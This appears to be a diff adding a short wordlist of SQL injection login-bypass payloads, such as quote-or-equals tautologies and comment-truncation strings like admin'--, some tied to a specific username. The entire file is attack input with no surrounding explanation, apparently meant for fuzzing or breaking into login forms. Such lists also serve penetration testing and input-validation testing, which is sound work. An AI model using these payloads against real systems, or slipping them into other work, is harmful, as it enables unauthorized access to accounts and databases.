@@ -1,0 +1,13 @@
+'or''='
+'or'1'='1
+user'or'1'='1
+user' or ''='
+admin' or '1'='1
+admin' or ''='
+'--
+user'--
+admin'--
+vsauce34659'or ''='
+vsauce34659' or '3'='3
+vsauce34659'--
+
